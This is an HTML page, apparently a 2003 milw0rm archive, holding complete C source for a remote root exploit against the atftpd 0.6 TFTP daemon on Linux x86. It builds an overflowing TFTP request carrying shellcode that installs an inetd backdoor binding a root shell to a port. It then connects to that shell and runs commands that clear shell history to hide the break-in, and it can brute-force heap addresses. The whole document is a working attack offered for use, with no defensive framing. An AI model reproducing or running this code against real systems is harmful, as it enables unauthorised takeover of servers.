<html><head><title>Atftpd 0.6 Remote Root Exploit (atftpdx.c)
</title></head><pre>/**
 ** PoC linux/86 remote exploit against atftpd (c) gunzip ( FIXED )
 **
 **
*/
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;signal.h&gt;

#define HEAP_START	0x080514b4
#define HEAP_END	0x080594b4

#define BACKDOOR	&quot;rfe&quot;	/* port MUST be &gt; 1024 		*/
#define NOPNUM		128	/* number of nops		*/
#define PORT		69	/* tftpd port		*/
#define	BUFSIZE		512	/* size of exploit buffer 	*/
#define TIMEOUT		0x5	/* timeout in sec.		*/
#define NOALARM		0x0	/* no timeout		*/
#define	RRQ		0x1	/* request method		*/
#define MODE		&quot;octet&quot;	/* request mode		*/
#define OFFSET 		16000	/* distance of nops from heap	*/

struct target {
	char * name ;
	unsigned int	align ;
	unsigned int	len ;
	unsigned int	retaddr ;
} tg[] = 
	{ 
		{ &quot;Linux (Debian 3.0)&quot;,	0,	264, 	0x0805560c 	}, 
	  	{ NULL,			0, 	0, 	0 		}
	};

char shellcode[]= /* taken from lsd-pl.net */
    &quot;\xeb\x22&quot;             /* jmp     &lt;cmdshellcode+36&gt;      */
    &quot;\x59&quot;                 /* popl    %ecx                   */
    &quot;\x31\xc0&quot;             /* xorl    %eax,%eax              */
    &quot;\x50&quot;                 /* pushl   %eax                   */
    &quot;\x68&quot;&quot;//sh&quot;           /* pushl   $0x68732f2f            */
    &quot;\x68&quot;&quot;/bin&quot;           /* pushl   $0x6e69622f            */
    &quot;\x89\xe3&quot;             /* movl    %esp,%ebx              */
    &quot;\x50&quot;                 /* pushl   %eax                   */
    &quot;\x66\x68&quot;&quot;-c&quot;         /* pushw   $0x632d                */
    &quot;\x89\xe7&quot;             /* movl    %esp,%edi              */
    &quot;\x50&quot;                 /* pushl   %eax                   */
    &quot;\x51&quot;                 /* pushl   %ecx                   */
    &quot;\x57&quot;                 /* pushl   %edi                   */
    &quot;\x53&quot;                 /* pushl   %ebx                   */
    &quot;\x89\xe1&quot;             /* movl    %esp,%ecx              */
    &quot;\x99&quot;                 /* cdql                           */
    &quot;\xb0\x0b&quot;             /* movb    $0x0b,%al              */
    &quot;\xcd\x80&quot;             /* int     $0x80                  */
    &quot;\xe8\xd9\xff\xff\xff&quot; /* call    &lt;cmdshellcode+2&gt;       */
    &quot;echo &quot; BACKDOOR &quot; stream tcp nowait nobody /bin/sh sh -i&gt;/tmp/.x ;/usr/sbin/inetd /tmp/.x;&quot;
;

void timeout( int sig )  
{
	alarm( NOALARM );
	signal( SIGALRM, SIG_DFL );
	fprintf(stderr,&quot;[-] Timeout.\n&quot;);
	exit( EXIT_FAILURE );
} 

int shell( int fd )
{
        int rd ;
        fd_set rfds;
        static char buff[ 1024 ];
	char INIT_CMD[] = &quot;unset HISTFILE; rm -f /tmp/.x; echo; id; uname -a\n&quot;;

        write(fd, INIT_CMD, strlen( INIT_CMD ));

        while(1) {
                FD_ZERO( &amp;rfds );
                FD_SET(0, &amp;rfds);
                FD_SET(fd, &amp;rfds);

                if(select(fd+1, &amp;rfds, NULL, NULL, NULL) &lt; 1) {
			perror(&quot;[-] Select&quot;);
			exit( EXIT_FAILURE );
		}
                if( FD_ISSET(0, &amp;rfds) ) {
                        if( (rd = read(0, buff, sizeof(buff))) &lt; 1) {
				perror(&quot;[-] Read&quot;);
				exit( EXIT_FAILURE );
			}
                        if( write(fd,buff,rd) != rd) {
				perror(&quot;[-] Write&quot;);
				exit( EXIT_FAILURE );
			}
                }
                if( FD_ISSET(fd, &amp;rfds) ) {
                        if( (rd = read(fd, buff, sizeof(buff))) &lt; 1) {
				exit( EXIT_SUCCESS );
			}
                        write(1, buff, rd);
                }
        }
}

int try( unsigned short bport, unsigned long ip  )
{
        int                     sockfd ;
        struct sockaddr_in      sheep ;

        if ((sockfd = socket (AF_INET, SOCK_STREAM, 0)) == -1)
	{
                perror(&quot;[-] Socket&quot;);
		exit( EXIT_FAILURE );
	}

        sheep.sin_family = AF_INET;
        sheep.sin_addr.s_addr = ip ;
        sheep.sin_port = htons ( bport );

        signal( SIGALRM, timeout ); 
	alarm( TIMEOUT );

        if ( connect(sockfd,(struct sockaddr *)&amp;sheep,sizeof(sheep)) == -1 ) 
	{
		alarm( NOALARM );
		signal(SIGALRM,SIG_DFL);
                return 0;
	}

        alarm( NOALARM ); 
	signal(SIGALRM,SIG_DFL);

        return sockfd ;
}
		
char * xp_make_str( unsigned int len, unsigned int align, unsigned long retaddr )
{
	int c ;
	char * 	xp = (char *)calloc( BUFSIZE, sizeof(char) );
	char * 	code = shellcode ;

	if( !xp ) {
                fprintf(stderr, &quot;[-] Not enough memory !\n&quot;);
                exit( EXIT_FAILURE );
        }

	/* stupid check */

	if (( align + len ) &gt; (BUFSIZE - strlen( shellcode ) - 32)) {
		fprintf(stderr, &quot;[-] String too long or align too high.\n&quot;);
		exit( EXIT_FAILURE );
	}
	/* 
 	 * our buffer shoud look like this
 	 *
 	 * [ NOPS ][ SHELLCODE ][ RETADDR * 4 ][ 0 ][ MODE ][ 0 ][ NOPS ][ SHELLCODE ]
 	 *                                    |_____&gt; len
	*/
	memset ( xp, 0x41, BUFSIZE );

	memcpy( xp + len - strlen( code ) - 16, code, strlen( code )); 

	for ( c = align + len - 16 ; c &lt; len  ; c += 4 )
		*(long *)( xp + c ) = retaddr ;

	*( xp ) = 0x0 ;
	*( xp + 1 ) = RRQ ;
	*( xp + len )= '\0' ;

	memcpy( xp + len + 1, MODE, strlen( MODE )); 

	*( xp + len + 1 + strlen( MODE )) = '\0' ;

	memcpy ( xp + BUFSIZE - strlen( code ), code, strlen( code ));

	return xp ;
} 

void usage( char * a )
{
	int o = 0 ;
	fprintf(stderr, 
		&quot;__Usage: %s -h host -t target [options]\n\n&quot;
		&quot;-o\toffset\n&quot; 
		&quot;-a\talign\n&quot;
		&quot;-s\tstep for bruteforcing (try 120 &lt;= step &lt;= 512)\n&quot;
		&quot;-l\tlength of filename\n&quot;
		&quot;-v\ttreceives packets too (check if daemon's crashed)\n&quot;
		&quot;-b\tenables bruteforce (dangerous !)\n\n&quot;, a);
	while( tg[o].name != NULL )
	{
		fprintf(stderr, &quot;\t%d - %s\n&quot;, o, tg[o].name ); o++ ;
	} 
	fprintf( stderr, &quot;\n&quot; );
	exit( EXIT_FAILURE );
}

int main(int argc, char *argv[])
{
	int 			sfd, t = 0, bport = 0, opt = 0, offset = 0, 
				want_receive = 0, brute = 0, yeah = 0, step = 0;
        struct 	servent 	* se ;
	unsigned long		n ;
	char * 			host ; 
        struct 	sockaddr_in 	server ;
	int 			len = sizeof(server);

        char * rbuf = (char *)calloc( BUFSIZE + 4, sizeof(char) );
        char * wbuf = (char *)calloc( BUFSIZE + 4, sizeof(char) );

        if ( !wbuf || !rbuf )  {
                fprintf(stderr, &quot;[-] Not enough memory !\n&quot;);
                exit( EXIT_FAILURE );
        }

	memset(&amp;server, 0, sizeof(server));

        fprintf(stderr,&quot;\nlinux/x86 atftpd remote exploit by gunzip\n\n&quot;);

	if ( argc &lt; 3 ) 
		usage( argv[0] );

        while ((opt = getopt(argc, argv, &quot;bvo:a:l:h:t:s:&quot;)) != EOF) {
                switch(opt)
                {
			case 's': step = atoi( optarg ); break ;
			case 'h': host = strdup ( optarg ); break;
			case 't': t = atoi(optarg); break;
			case 'b': brute++ ; break ;
			case 'v': want_receive++ ; break ;
			case 'o': offset += atoi( optarg ); break;
			case 'a': tg[t].align = atoi( optarg ); break;
			case 'l': tg[t].len = atoi( optarg ); break;
			default: usage( argv[0] ); break;
		}
	}
        if (( se = getservbyname( BACKDOOR, NULL )) == NULL ) {
                perror(&quot;[-] Getservbyname&quot;);
		exit( EXIT_FAILURE );
	}
	if ((bport = ntohs( se-&gt;s_port )) &lt; 1024 ) {
		fprintf(stderr, &quot;[-] Backdoor port must be &lt;= 1024\n&quot;);
		exit( EXIT_FAILURE );
	}
        if ( inet_aton( host , &amp;server.sin_addr) == 0 ) {
        	struct hostent * he ;
        	
        	if ( (he = gethostbyname( host )) == NULL )  {
			perror(&quot;[-] Gethostbyname&quot;);
			exit( EXIT_FAILURE );
		}
        	server.sin_addr.s_addr =
                  	((struct in_addr *)(he-&gt;h_addr))-&gt;s_addr ;
        }
	if ((sfd = socket(AF_INET, SOCK_DGRAM, 0)) == -1 ) {
		perror(&quot;[-] Socket&quot;);
		exit( EXIT_FAILURE );
	}
	
	fprintf(stdout,&quot;[+] Sending request to host %s\n&quot;,
		inet_ntoa(server.sin_addr));

	if ( !step ) step = tg[t].len / 2 ; 
        if ( brute ) offset += OFFSET ;

	for( n = HEAP_START + offset; n &lt; HEAP_END ; n += step ) {
	
		fprintf(stdout,&quot;[+] Using len=%d align=%d retaddr=0x%.8x shellcode=%d bport=%d\n&quot;,
			tg[t].len, tg[t].align, 
			(brute ) ? (unsigned int)n : (unsigned int)tg[t].retaddr + offset, 
			strlen(shellcode), bport );

		if ( !brute )
			wbuf = xp_make_str( tg[t].len, tg[t].align, tg[t].retaddr + offset );
		else
			wbuf = xp_make_str( tg[t].len, tg[t].align, n ); 

        	server.sin_port = htons( PORT );

		if ( sendto(sfd, wbuf,
       			(size_t) BUFSIZE, 0,
        		(struct sockaddr *)&amp;server,
                	(socklen_t)sizeof(struct sockaddr)) &lt; tg[t].len)
		{
			perror(&quot;[-] Sendto&quot;);
		}
		else if ( want_receive )
		{	
		        signal( SIGALRM, timeout );
		        alarm( TIMEOUT );

			if ( recvfrom(sfd, rbuf, 
				(size_t) BUFSIZE, 0,
                		(struct sockaddr *)&amp;server,
                		(socklen_t *)&amp;len) != -1 )
			{
                        	alarm( NOALARM );
                                signal( SIGALRM, SIG_DFL);
				fprintf( stdout,&quot;[+] Received: %.2x %.2x %.2x %.2x\n&quot;,
					rbuf[0],rbuf[1],rbuf[2],rbuf[3]);
			}
			else {
				perror(&quot;[-] Recvfrom&quot;);
			}
		}
		sleep ( 1 ) ;

		if((yeah = try( bport, server.sin_addr.s_addr ))) {
				shell( yeah );
				exit( EXIT_SUCCESS );
		}

		if ( !brute ) break ;

		memset( wbuf, 0, BUFSIZE + 4 );
		memset( rbuf, 0, BUFSIZE + 4 );
	}	

	return 1 ;
}


// milw0rm.com [2003-06-10]</pre></html>